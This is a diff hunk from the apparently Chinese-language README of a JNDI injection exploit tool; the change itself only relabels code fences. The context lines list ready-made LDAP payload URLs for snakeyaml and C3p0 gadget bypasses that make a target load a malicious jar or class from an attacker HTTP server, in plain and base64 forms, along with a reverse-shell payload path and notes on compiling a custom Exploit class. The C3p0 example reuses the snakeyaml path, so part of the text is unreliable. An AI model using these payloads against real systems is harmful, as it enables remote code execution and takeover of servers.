@@ -285,14 +285,14 @@ ldap://ip:port/bypass/mvel/reverseshell2/127.0.0.1/4444
 
 **snakeyaml ：**  `command=http://127.0.0.1:8080/exp.jar 加载恶意类`。可以使用提供的yaml-payload-master(需要修改代码，重新生成jar，内附使用说明)。无法使用reverseshell。
 
-```http
+```java
 ldap://ip:port/bypass/snakeyaml/http://127.0.0.1:8080/exp.jar
 ldap://ip:port/bypass/snakeyaml/base64/aHR0cDovLzEyNy4wLjAuMTo4MDgwL2V4cC5qYXI%3D
 ```
 
 **C3p0 ：**`command=http://127.0.0.1:8080:Exploit(端口为默认为8080)`  data目录下的Exploit可以进行参考,直接修改Exploit.java的命令使用javac编译(不用另外起http服务)
 
-```http
+```java
 ldap://ip:port/bypass/snakeyaml/http://127.0.0.1:8080:Exploit
 ldap://ip:port/bypass/snakeyaml/base64/aHR0cDovLzEyNy4wLjAuMTo4MDgwOkV4cGxvaXQ%3D
 ```
